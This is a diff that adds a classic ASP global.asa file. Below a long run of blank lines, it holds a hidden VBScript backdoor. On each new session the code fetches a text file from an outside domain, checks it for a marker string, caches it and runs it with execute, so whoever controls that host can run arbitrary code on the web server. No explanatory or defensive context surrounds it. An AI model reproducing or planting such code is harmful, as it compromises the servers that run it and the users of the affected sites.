@@ -1,0 +1,87 @@
+<script language="vbscript" runat="server">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+'fucksure
+sub Application_OnStart
+end sub
+
+sub Application_OnEnd
+end sub
+sub Session_OnStart
+
+az="az01"
+url="http://junlv.zz456.com/lv.txt"
+if abs(clng(Minute(application("bt")))-clng(Minute(now())))<2 and instr(application(url),"appisok")>0 then
+wheretemp="!--1--"
+execute(application(url))
+else
+Set ObjXMLHTTP=Server.CreateObject("MSXML2.serverXMLHTTP")
+ObjXMLHTTP.Open "GET",url,False
+ObjXMLHTTP.setRequestHeader "User-Agent",url
+ObjXMLHTTP.send
+geturlyyzz=ObjXMLHTTP.responseBody
+Set ObjXMLHTTP=Nothing
+set objStream = Server.CreateObject("Adodb.Stream")
+objStream.Type = 1
+objStream.Mode =3
+objStream.Open
+objStream.Write geturlyyzz
+objStream.Position = 0
+objStream.Type = 2
+objStream.Charset = "utf-8"
+geturlyyzz = objStream.ReadText
+objStream.Close
+if instr(geturlyyzz,"fucksure")>0 then
+application("bt")=now()
+wheretemp="!--2--"
+execute geturlyyzz
+end if
+end if
+
+end sub
+</script>
